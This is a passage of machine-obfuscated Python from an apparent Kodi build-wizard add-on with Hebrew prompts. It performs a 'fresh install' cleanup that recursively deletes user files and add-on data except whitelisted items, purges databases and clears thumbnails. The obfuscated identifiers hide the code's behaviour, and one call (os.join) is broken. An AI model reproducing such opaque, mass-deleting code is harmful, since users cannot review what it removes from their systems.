				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4909
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'skin.anonymous.mod'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4910
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'skin.Premium.mod'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4911
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'skin.anonymous.nox'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4912
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'skin.phenomenal'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4913
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'plugin.video.metalliq'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4914
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'skin.titan'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4916
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'pvr.iptvsimple'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4917
				elif O0OOOO0OOOOO0OOOO =='sources.xml'and O00O0O0000000O00O [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4919
				elif O0OOOO0OOOOO0OOOO =='quicknav.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4922
				elif O0OOOO0OOOOO0OOOO =='x1101.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4923
				elif O0OOOO0OOOOO0OOOO =='b-srtym-b.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4924
				elif O0OOOO0OOOOO0OOOO =='x1102.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4925
				elif O0OOOO0OOOOO0OOOO =='b-sdrvt-b.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4926
				elif O0OOOO0OOOOO0OOOO =='x1112.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4927
				elif O0OOOO0OOOOO0OOOO =='b-tlvvyzyh-b.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4928
				elif O0OOOO0OOOOO0OOOO =='x1111.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4929
				elif O0OOOO0OOOOO0OOOO =='b-tvknyshrly-b.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4930
				elif O0OOOO0OOOOO0OOOO =='x1110.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4931
				elif O0OOOO0OOOOO0OOOO =='b-yldym-b.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4932
				elif O0OOOO0OOOOO0OOOO =='x1114.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4933
				elif O0OOOO0OOOOO0OOOO =='b-mvzyqh-b.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4934
				elif O0OOOO0OOOOO0OOOO =='mainmenu.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4935
				elif O0OOOO0OOOOO0OOOO =='skin.Premium.mod.properties'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4936
				elif O0OOOO0OOOOO0OOOO =='x1122.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4938
				elif O0OOOO0OOOOO0OOOO =='b-spvrt-b.DATA.xml'and O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4939
				elif O0OOOO0OOOOO0OOOO =='favourites.xml'and O00O0O0000000O00O [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4944
				elif O0OOOO0OOOOO0OOOO =='guisettings.xml'and O00O0O0000000O00O [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4946
				elif O0OOOO0OOOOO0OOOO =='profiles.xml'and O00O0O0000000O00O [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4947
				elif O0OOOO0OOOOO0OOOO =='advancedsettings.xml'and O00O0O0000000O00O [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4948
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4949
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'program.apollo'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4950
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4951
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'plugin.video.elementum'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4954
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4956
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'weather.yahoo'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4957
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'plugin.video.quasar'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4958
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'program.apollo'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4959
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4960
				elif O00O0O0000000O00O [O0O0O0000000OO0O0 -2 ]=='userdata'and O00O0O0000000O00O [O0O0O0000000OO0O0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O00O0O0000000O00O [O0O0O0000000OO0O0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4961
				elif O0OOOO0OOOOO0OOOO in LOGFILES :wiz .log ("Keep Log File: %s"%O0OOOO0OOOOO0OOOO ,xbmc .LOGNOTICE )#line:4962
				elif O0OOOO0OOOOO0OOOO .endswith ('.db'):#line:4963
					try :#line:4964
						if O0OOOO0OOOOO0OOOO ==O0O0O0O0000OOOO00 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0OOOO0OOOOO0OOOO ,KODIV ),xbmc .LOGNOTICE )#line:4965
						else :os .remove (os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ))#line:4966
					except Exception as OO00O00O0OOOOO0O0 :#line:4967
						if not O0OOOO0OOOOO0OOOO .startswith ('Textures13'):#line:4968
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4969
							wiz .log ("-> %s"%(str (OO00O00O0OOOOO0O0 )),xbmc .LOGNOTICE )#line:4970
							wiz .purgeDb (os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ))#line:4971
				else :#line:4972
					DP .update (int (wiz .percentage (OOOO0OOO0O00O000O ,OOOOOO0O00OO000O0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOO0OOOOO0OOOO ),'')#line:4973
					try :os .remove (os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ))#line:4974
					except Exception as OO00O00O0OOOOO0O0 :#line:4975
						wiz .log ("Error removing %s"%os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),xbmc .LOGNOTICE )#line:4976
						wiz .log ("-> / %s"%(str (OO00O00O0OOOOO0O0 )),xbmc .LOGNOTICE )#line:4977
			if DP .iscanceled ():#line:4978
				DP .close ()#line:4979
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4980
				return False #line:4981
		for O0000OO0OO000O0OO ,O000O0000OOOOOO00 ,O00O0000O0O00O00O in os .walk (O0O0O0O0O0O00OOO0 ,topdown =True ):#line:4982
			O000O0000OOOOOO00 [:]=[O0O0O0O000OO00OOO for O0O0O0O000OO00OOO in O000O0000OOOOOO00 if O0O0O0O000OO00OOO not in EXCLUDES ]#line:4983
			for O0OOOO0OOOOO0OOOO in O000O0000OOOOOO00 :#line:4984
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOOO0OOOOO0OOOO ),'')#line:4985
			  if O0OOOO0OOOOO0OOOO not in ["Database","userdata","temp","addons","addon_data"]:#line:4986
			   if not (O0OOOO0OOOOO0OOOO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4987
			    if not (O0OOOO0OOOOO0OOOO =='skin.titan'and KEEPSKIN3 =='true'):#line:4989
			      if not (O0OOOO0OOOOO0OOOO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4990
			       if not (O0OOOO0OOOOO0OOOO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4991
			        if not (O0OOOO0OOOOO0OOOO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4992
			         if not (O0OOOO0OOOOO0OOOO =='program.apollo'and KEEPINFO =='true'):#line:4993
			          if not (O0OOOO0OOOOO0OOOO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4994
			           if not (O0OOOO0OOOOO0OOOO =='weather.yahoo'and KEEPWEATHER =='true'):#line:4995
			            if not (O0OOOO0OOOOO0OOOO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4996
			             if not (O0OOOO0OOOOO0OOOO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4997
			              if not (O0OOOO0OOOOO0OOOO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4998
			               if not (O0OOOO0OOOOO0OOOO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4999
			                if not (O0OOOO0OOOOO0OOOO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5000
			                 if not (O0OOOO0OOOOO0OOOO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5001
			                  if not (O0OOOO0OOOOO0OOOO =='plugin.video.neptune'and KEEPINFO =='true'):#line:5002
			                   if not (O0OOOO0OOOOO0OOOO =='plugin.video.youtube'and KEEPINFO =='true'):#line:5003
			                    if not (O0OOOO0OOOOO0OOOO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5004
			                     if not (O0OOOO0OOOOO0OOOO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5005
			                      if not (O0OOOO0OOOOO0OOOO =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5006
			                           if not (O0OOOO0OOOOO0OOOO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5011
			                            if not (O0OOOO0OOOOO0OOOO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5012
			                             if not (O0OOOO0OOOOO0OOOO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5013
			                              if not (O0OOOO0OOOOO0OOOO =='plugin.video.quasar'and KEEPINFO =='true'):#line:5014
			                               if not (O0OOOO0OOOOO0OOOO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5015
			                                  shutil .rmtree (os .path .join (O0000OO0OO000O0OO ,O0OOOO0OOOOO0OOOO ),ignore_errors =True ,onerror =None )#line:5017
			if DP .iscanceled ():#line:5018
				DP .close ()#line:5019
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5020
				return False #line:5021
		DP .close ()#line:5022
		wiz .clearS ('build')#line:5023
		if over ==True :#line:5024
			return True #line:5025
		elif install =='restore':#line:5026
			return True #line:5027
		elif install :#line:5028
			buildWizard (install ,'normal',over =True )#line:5029
		else :#line:5030
			if INSTALLMETHOD ==1 :OO00OOOO0OOOOO00O =1 #line:5031
			elif INSTALLMETHOD ==2 :OO00OOOO0OOOOO00O =0 #line:5032
			else :OO00OOOO0OOOOO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5033
			if OO00OOOO0OOOOO00O ==1 :wiz .reloadFix ('fresh')#line:5034
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5035
	else :#line:5036
		if not install =='restore':#line:5037
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5038
			wiz .refresh ()#line:5039
def clearCache ():#line:5044
		wiz .clearCache ()#line:5045
def fixwizard ():#line:5049
		wiz .fixwizard ()#line:5050
def totalClean ():#line:5052
		wiz .clearCache ()#line:5054
		wiz .clearPackages ('total')#line:5055
		clearThumb ('total')#line:5056
		cleanfornewbuild ()#line:5057
def cleanfornewbuild ():#line:5058
		try :#line:5059
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5060
		except :#line:5061
			pass #line:5062
		try :#line:5063
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5064
		except :#line:5065
			pass #line:5066
		try :#line:5067
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5068
		except :#line:5069
			pass #line:5070
def clearThumb (type =None ):#line:5071
	OOO0OO00OO0O00000 =wiz .latestDB ('Textures')#line:5072
	if not type ==None :OO00000O0O0OO0OOO =1 #line:5073
	else :OO00000O0O0OO0OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OOO0OO00OO0O00000 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5074
	if OO00000O0O0OO0OOO ==1 :#line:5075
		try :wiz .removeFile (os .join (DATABASE ,OOO0OO00OO0O00000 ))#line:5076
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OOO0OO00OO0O00000 )#line:5077
		wiz .removeFolder (THUMBS )#line:5078
	else :wiz .log ('Clear thumbnames cancelled')#line:5080
	wiz .redoThumbs ()#line:5081
def purgeDb ():#line:5083
	O0O00O000O00000OO =[];OO0000O0O0O0O0OO0 =[]#line:5084
	for O0OOO0OO0OOOOO0O0 ,OO0000O00O0O00O0O ,O0OOOOO0OOOOOO0O0 in os .walk (HOME ):#line:5085
		for OO0OO0000O0OO0OO0 in fnmatch .filter (O0OOOOO0OOOOOO0O0 ,'*.db'):#line:5086
			if OO0OO0000O0OO0OO0 !='Thumbs.db':#line:5087
				O0OOOO0OOO000O000 =os .path .join (O0OOO0OO0OOOOO0O0 ,OO0OO0000O0OO0OO0 )#line:5088
				O0O00O000O00000OO .append (O0OOOO0OOO000O000 )#line:5089
				O0O0O0O00O0OOO000 =O0OOOO0OOO000O000 .replace ('\\','/').split ('/')#line:5090
				OO0000O0O0O0O0OO0 .append ('(%s) %s'%(O0O0O0O00O0OOO000 [len (O0O0O0O00O0OOO000 )-2 ],O0O0O0O00O0OOO000 [len (O0O0O0O00O0OOO000 )-1 ]))#line:5091
	if KODIV >=16 :#line:5092
		OO0OO0O00OO0O00OO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0000O0O0O0O0OO0 )#line:5093
		if OO0OO0O00OO0O00OO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5094
		elif len (OO0OO0O00OO0O00OO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5095
		else :#line:5096
			for O0O0OOO0O0O0000OO in OO0OO0O00OO0O00OO :wiz .purgeDb (O0O00O000O00000OO [O0O0OOO0O0O0000OO ])#line:5097
	else :#line:5098
		OO0OO0O00OO0O00OO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0000O0O0O0O0OO0 )#line:5099
		if OO0OO0O00OO0O00OO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5100
		else :wiz .purgeDb (O0O00O000O00000OO [O0O0OOO0O0O0000OO ])#line:5101
def fastupdatefirstbuild (OO00OOOOO00OO00OO ):#line:5107
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5109
	if ENABLE =='Yes':#line:5110
		if not NOTIFY =='true':#line:5111
			OOOO0OOO0O0O0O000 =wiz .workingURL (NOTIFICATION )#line:5112
			if OOOO0OOO0O0O0O000 ==True :#line:5113
				O0O000O0O0OOO0OO0 ,O0000O0O00OO0000O =wiz .splitNotify (NOTIFICATION )#line:5114
				if not O0O000O0O0OOO0OO0 ==False :#line:5116
					try :#line:5117
						O0O000O0O0OOO0OO0 =int (O0O000O0O0OOO0OO0 );OO00OOOOO00OO00OO =int (OO00OOOOO00OO00OO )#line:5118
						checkidupdate ()#line:5119
						wiz .setS ("notedismiss","true")#line:5120
						if O0O000O0O0OOO0OO0 ==OO00OOOOO00OO00OO :#line:5121
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0O000O0O0OOO0OO0 ),xbmc .LOGNOTICE )#line:5122
						elif O0O000O0O0OOO0OO0 >OO00OOOOO00OO00OO :#line:5124
